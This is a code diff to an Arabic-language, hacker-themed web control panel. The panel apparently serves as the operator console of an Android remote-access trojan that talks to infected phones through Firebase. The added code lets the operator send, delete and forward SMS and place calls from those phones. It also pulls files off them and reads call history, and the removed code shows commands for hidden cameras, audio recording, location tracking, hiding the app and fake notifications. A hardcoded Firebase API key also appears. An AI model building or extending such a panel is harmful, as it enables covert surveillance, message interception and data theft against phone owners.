+        <div class="section-title"><span class="skull-small">💀</span> 💬 إدارة الرسائل</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn file-btn" onclick="showSmsActions()"><span class="icon">💬</span><span class="label">إدارة الرسائل</span></div>
+        </div>
+        <div id="smsActions" style="display:none;background:#0a0000;padding:10px;border-radius:10px;border:1px solid #330000;margin:5px 0;">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                <div class="mini-btn" onclick="execCmd('send_sms')">📤 إرسال رسالة</div>
+                <div class="mini-btn" onclick="execCmd('delete_sms')">🗑️ حذف رسالة</div>
+                <div class="mini-btn" onclick="execCmd('forward_sms')">↪️ إعادة توجيه رسالة</div>
+            </div>
+        </div>
+
+        <!-- ===== القسم 10: أوامر المكالمات ===== -->
+        <div class="section-title"><span class="skull-small">💀</span> 📞 إدارة المكالمات</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn file-btn" onclick="showCallActions()"><span class="icon">📞</span><span class="label">إدارة المكالمات</span></div>
+        </div>
+        <div id="callActions" style="display:none;background:#0a0000;padding:10px;border-radius:10px;border:1px solid #330000;margin:5px 0;">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                <div class="mini-btn" onclick="execCmd('make_call')">📞 إجراء مكالمة</div>
+                <div class="mini-btn" onclick="execCmd('end_call')">❌ إنهاء المكالمة</div>
+                <div class="mini-btn" onclick="execCmd('call_history')">📋 سجل المكالمات</div>
+            </div>
         </div>
     </div>
 
-    <!-- صفحة النتيجة -->
     <div id="resultPage" class="page">
         <button class="back-btn" onclick="showPage('commandsPage')">🔙 رجوع</button>
         <div class="result-title" id="resultTitle">📄 النتيجة</div>
         <div class="result-content" id="resultContent">⏳ جاري التنفيذ...</div>
-        <div id="resultActions" style="margin-top:10px;display:none;">
+        <div id="resultActions" style="margin-top:12px;display:none;">
             <button class="download-btn" id="resultDownloadBtn" onclick="downloadResult()">📥 تحميل الملف</button>
             <button class="open-btn" id="resultOpenBtn" onclick="openResult()">📂 فتح الملف</button>
+            <button class="view-btn" id="resultViewBtn" onclick="viewResult()">👁️ عرض الملف</button>
         </div>
         <div class="file-path" id="resultPath"></div>
         <div id="actionMessage" class="action-message" style="display:none;"></div>
     </div>
 
-    <!-- السجل -->
     <div class="log" id="log">[+] النظام جاهز</div>
-
-    <!-- تذييل -->
     <div class="hacker-text">/// اختراق_النظام ///</div>
     <div class="footer">💀 <span>بـــلاك</span> 💀</div>
-
     <script>
         let selectedDevice = null;
         let devices = {};
@@ -175,7 +286,8 @@
         let currentData = null;
         let currentFileName = 'data.txt';
         let currentFilePath = '';
-        let currentBlobUrl = '';
+        let currentFileUrl = '';
+        let currentCommand = '';
 
         // تحميل الإعدادات المحفوظة
         document.getElementById('apiKey').value = localStorage.getItem('fb_apiKey') || 'AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc';
@@ -200,13 +312,48 @@
             el.scrollTop = el.scrollHeight;
         }
 
+        function showActionMessage(text, type = 'success') {
+            const el = document.getElementById('actionMessage');
+            el.textContent = text;
+            el.className = 'action-message';
+            if (type === 'danger') el.classList.add('danger');
+            else if (type === 'success') el.classList.add('success');
+            el.style.display = 'block';
+            setTimeout(() => { el.style.display = 'none'; }, 8000);
+        }
+
+        function showCountSelector(cmd, label) {
+            currentCommand = cmd;
+            const count = prompt(`اختر عدد ${label} (اكتب رقم أو 'all' للكل):`, '10');
+            if (count === null) return;
+            const finalCmd = count.toLowerCase() === 'all' ? cmd + '_all' : cmd + '_' + count;
+            execCmd(finalCmd);
+        }
+
+        function showFlashOptions() {
+            const el = document.getElementById('flashOptions');
+            el.style.display = el.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function showContactActions() {
+            const el = document.getElementById('contactActions');
+            el.style.display = el.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function showSmsActions() {
+            const el = document.getElementById('smsActions');
+            el.style.display = el.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function showCallActions() {
+            const el = document.getElementById('callActions');
+            el.style.display = el.style.display === 'none' ? 'block' : 'none';
+        }
+
         function initFirebase() {
             const apiKey = document.getElementById('apiKey').value.trim();
             const databaseURL = document.getElementById('databaseURL').value.trim();
-            if (!apiKey || !databaseURL) {
-                log('⚠️ مطلوب');
-                return;
-            }
+            if (!apiKey || !databaseURL) { log('⚠️ مطلوب'); return; }
             try {
                 const config = { apiKey: apiKey, databaseURL: databaseURL };
                 firebase.initializeApp(config);
@@ -216,7 +363,6 @@
                 showPage('mainPage');
                 log('✅ تم الاتصال بـ فايربيز');
 
-                // مراقبة الأجهزة
                 database.ref('devices').on('value', snapshot => {
                     const data = snapshot.val();
                     devices = {};
@@ -232,9 +378,7 @@
                     log('📱 تم تحديث الأجهزة (' + Object.keys(devices).length + ')');
                 });
 
-            } catch(e) {
-                log('❌ خطأ: ' + e.message);
-            }
+            } catch(e) { log('❌ خطأ: ' + e.message); }
         }
 
         function updateDevices() {
@@ -244,7 +388,7 @@
             count.textContent = '(' + keys.length + ')';
             container.innerHTML = '';
             if (keys.length === 0) {
-                container.innerHTML = '<div style="text-align:center;padding:15px;color:#660000;font-size:11px;">⏳ في انتظار تسجيل جهاز...</div>';
+                container.innerHTML = '<div style="text-align:center;padding:20px;color:#660000;font-size:13px;">⏳ في انتظار تسجيل جهاز...</div>';
                 return;
             }
             for (let id in devices) {
@@ -252,10 +396,12 @@
                 const div = document.createElement('div');
                 div.className = 'device-item';
                 const name = dev.device_name || dev.model || id;
-                div.innerHTML = '<span>📱 ' + name + '</span><span class="status">🟢 متصل</span>';
+                const version = dev.android || 'غير معروف';
+                div.innerHTML = '<span>📱 ' + name + '</span><span class="version">🤖 ' + version + '</span><span class="status">🟢 متصل</span>';
                 div.onclick = () => {
                     selectedDevice = id;
                     document.getElementById('selectedDisplay').textContent = '🎯 الجهاز المحدد: ' + name;
+                    document.getElementById('deviceVersion').textContent = '📱 أندرويد: ' + version;
                     showPage('commandsPage');
                     if (dataListener) {
                         database.ref('devices').child(id).child('data').off('value', dataListener);
@@ -274,14 +420,8 @@
         }
 
         function execCmd(cmd) {
-            if (!selectedDevice) {
-                log('⚠️ اختر جهازاً أولاً');
-                return;
-            }
-            if (!commandsRef) {
-                log('❌ غير متصل');
-                return;
-            }
+            if (!selectedDevice) { log('⚠️ اختر جهازاً أولاً'); return; }
+            if (!commandsRef) { log('❌ غير متصل'); return; }
             log('📤 أمر مرسل: ' + cmd + ' → ' + selectedDevice);
             commandsRef.child(selectedDevice).set(cmd);
             document.getElementById('resultTitle').textContent = '⏳ جاري التنفيذ: ' + cmd;
@@ -290,60 +430,7 @@
             document.getElementById('resultPath').textContent = '';
             document.getElementById('actionMessage').style.display = 'none';
             showPage('resultPage');
-
-            // تأكيد للأوامر الخطرة
-            if (cmd === 'reboot') {
-                showActionMessage('🔄 سيتم إعادة تشغيل الجهاز خلال 3 ثوانٍ...', 'danger');
-                setTimeout(() => {
-                    showActionMessage('✅ تم إعادة التشغيل', 'success');
-                }, 4000);
-            } else if (cmd === 'shutdown') {
-                showActionMessage('⏻ سيتم إيقاف تشغيل الجهاز خلال 3 ثوانٍ...', 'danger');
-                setTimeout(() => {
-                    showActionMessage('✅ تم إيقاف التشغيل', 'success');
-                }, 4000);
-            } else if (cmd === 'lock_device') {
-                showActionMessage('🔒 تم قفل الجهاز', 'danger');
-            } else if (cmd === 'flash_on') {
-                showActionMessage('🔦 تم تشغيل الكشاف', 'success');
-            } else if (cmd === 'flash_off') {
-                showActionMessage('🔦 تم إطفاء الكشاف', 'success');
-            } else if (cmd === 'start_record') {
-                showActionMessage('🎤 بدأ التسجيل الصوتي...', 'success');
-            } else if (cmd === 'stop_record') {
-                showActionMessage('⏹ تم إيقاف التسجيل وإرسال الملف', 'success');
-            } else if (cmd === 'take_photo') {
-                showActionMessage('📸 تم التقاط الصورة من الكاميرا الخلفية', 'success');
-            } else if (cmd === 'take_photo_front') {
-                showActionMessage('🤳 تم التقاط الصورة من الكاميرا الأمامية', 'success');
-            } else if (cmd === 'hide_app') {
-                showActionMessage('👁‍🗨 تم إخفاء التطبيق', 'danger');
-            } else if (cmd === 'show_app') {
-                showActionMessage('👁 تم إظهار التطبيق', 'success');
-            } else if (cmd === 'fake_notif') {
-                showActionMessage('🔔 تم إرسال إشعار وهمي', 'success');
-            } else if (cmd === 'start_location_track') {
-                showActionMessage('📍 بدأ تتبع الموقع (كل دقيقة)', 'success');
-            } else if (cmd === 'stop_location_track') {
-                showActionMessage('🛑 تم إيقاف تتبع الموقع', 'success');
-            } else if (cmd === 'get_location') {
-                showActionMessage('📍 جاري الحصول على الموقع...', 'success');
-            } else {
-                showActionMessage('⏳ جاري تنفيذ الأمر...', 'success');
-            }
-        }
-
-        function showActionMessage(text, type = 'success') {
-            const el = document.getElementById('actionMessage');
-            el.textContent = text;
-            el.className = 'action-message';
-            if (type === 'danger') {
-                el.classList.add('danger');
-            }
-            el.style.display = 'block';
-            setTimeout(() => {
-                el.style.display = 'none';
-            }, 8000);
+            showActionMessage('⏳ جاري تنفيذ الأمر...', 'success');
         }
 
         function showResult(data) {
@@ -353,10 +440,12 @@
             const pathEl = document.getElementById('resultPath');
             const downloadBtn = document.getElementById('resultDownloadBtn');
             const openBtn = document.getElementById('resultOpenBtn');
+            const viewBtn = document.getElementById('resultViewBtn');
 
             title.textContent = '📄 النتيجة';
             actions.style.display = 'none';
             pathEl.textContent = '';
+            currentFileUrl = '';
 
             // الموقع
             if (data.includes('LOCATION') && data.includes(',')) {
@@ -375,7 +464,48 @@
                 } catch(e) {}
             }
 
-            // ملف
+            // ملف من Firebase Storage (رابط)
+            if (data.includes('url') && data.includes('"name"')) {
+                try {
+                    const json = JSON.parse(data);
+                    if (json.url && json.name) {
+                        currentFileName = json.name;
+                        currentFilePath = json.path || 'غير معروف';
+                        currentFileUrl = json.url;
+                        content.innerHTML = `<div class="file-received">✅ تم استلام الملف: ${json.name}</div>
+                            <div style="color:#aaa;font-size:12px;margin-top:4px;">${json.caption || ''}</div>
+                            <div class="file-view">🔗 رابط: <a href="${json.url}" target="_blank" style="color:#00ff00;">${json.url}</a></div>`;
+                        actions.style.display = 'block';
+                        pathEl.textContent = '📂 مسار الملف: ' + currentFilePath;
+                        downloadBtn.onclick = function() {
+                            const a = document.createElement('a');
+                            a.href = currentFileUrl;
+                            a.download = json.name;
+                            a.target = '_blank';
+                            document.body.appendChild(a);
+                            a.click();
+                            document.body.removeChild(a);
+                            log('📥 تم تحميل الملف: ' + json.name);
+                            showActionMessage('📥 تم تحميل الملف: ' + json.name, 'success');
+                        };
+                        openBtn.onclick = function() {
+                            const a = document.createElement('a');
+                            a.href = currentFileUrl;
+                            a.target = '_blank';
+                            a.click();
+                            log('📂 تم فتح الملف: ' + json.name);
+                            showActionMessage('📂 تم فتح الملف: ' + json.name, 'success');
+                        };
+                        viewBtn.onclick = function() {
+                            content.innerHTML += `<div class="file-view"><iframe src="${currentFileUrl}" style="width:100%;height:300px;border:none;background:#0a0a0a;"></iframe></div>`;
+                            showActionMessage('👁️ تم عرض الملف', 'success');
+                        };
+                        return;
+                    }
+                } catch(e) {}
+            }
+
+            // ملف قديم (Base64)
             if (data.includes('FILE')) {
                 try {
                     const json = JSON.parse(data);
@@ -388,13 +518,16 @@
                             bytes[i] = binary.charCodeAt(i);
                         }
                         const blob = new Blob([bytes]);
-                        currentBlobUrl = URL.createObjectURL(blob);
-                        content.innerHTML = `<div class="file-received">✅ تم استلام الملف: ${json.name}</div><div style="color:#aaa;font-size:11px;margin-top:4px;">${json.caption || ''}</div>`;
+                        const url = URL.createObjectURL(blob);
+                        currentFileUrl = url;
+                        content.innerHTML = `<div class="file-received">✅ تم استلام الملف: ${json.name}</div>
+                            <div style="color:#aaa;font-size:12px;margin-top:4px;">${json.caption || ''}</div>
+                            <div class="file-view">📄 محتوى الملف متاح للتحميل</div>`;
                         actions.style.display = 'block';
                         pathEl.textContent = '📂 مسار الملف: ' + currentFilePath;
                         downloadBtn.onclick = function() {
                             const a = document.createElement('a');
-                            a.href = currentBlobUrl;
+                            a.href = url;
                             a.download = json.name;
                             document.body.appendChild(a);
                             a.click();
@@ -404,11 +537,18 @@
                         };
                         openBtn.onclick = function() {
                             const a = document.createElement('a');
-                            a.href = currentBlobUrl;
+                            a.href = url;
                             a.target = '_blank';
                             a.click();
                             log('📂 تم فتح الملف: ' + json.name);
                             showActionMessage('📂 تم فتح الملف: ' + json.name, 'success');
+                        };
+                        viewBtn.onclick = function() {
+                            const a = document.createElement('a');
+                            a.href = url;
+                            a.target = '_blank';
+                            a.click();
+                            showActionMessage('👁️ تم عرض الملف', 'success');
                         };
                         return;
                     }
@@ -424,6 +564,7 @@
 
         function downloadResult() { /* handled */ }
         function openResult() { /* handled */ }
+        function viewResult() { /* handled */ }
 
         // تشغيل تلقائي إذا كانت الإعدادات محفوظة
         if (localStorage.getItem('fb_apiKey') && localStorage.getItem('fb_databaseURL')) {
